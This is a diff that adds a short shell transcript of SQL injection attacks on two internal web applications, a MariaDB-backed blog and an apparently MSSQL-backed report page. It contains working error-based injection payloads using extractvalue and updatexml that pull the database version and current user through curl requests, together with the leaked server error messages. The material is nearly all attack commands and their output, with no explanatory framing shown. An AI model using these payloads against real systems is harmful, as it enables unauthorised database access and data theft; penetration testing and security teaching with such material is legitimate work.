@@ -1,0 +1,17 @@
+$ curl -s "http://blog.acme.internal/article?id=14'"
+HTTP/1.1 500 Internal Server Error
+
+<b>Warning</b>:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in <b>/var/www/html/article.php</b> on line <b>27</b><br />
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''14''' at line 1
+
+$ curl -s "http://blog.acme.internal/article?id=14 AND extractvalue(1,concat(0x7e,version()))-- -"
+XPATH syntax error: '~10.6.16-MariaDB-0ub'
+
+$ curl -s "http://blog.acme.internal/article?id=14 AND updatexml(1,concat(0x7e,(SELECT current_user())),1)-- -"
+XPATH syntax error: '~blog_app@localhost'
+
+$ curl -s "http://mssql-app.megacorp.local/report.aspx?year=2026'"
+System.Data.SqlClient.SqlException (0x80131904): Unclosed quotation mark after the character string ''.
+Incorrect syntax near '2026'.
+Microsoft SQL Server, Version 15.00.2000 (SQL Server 2019)
+   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
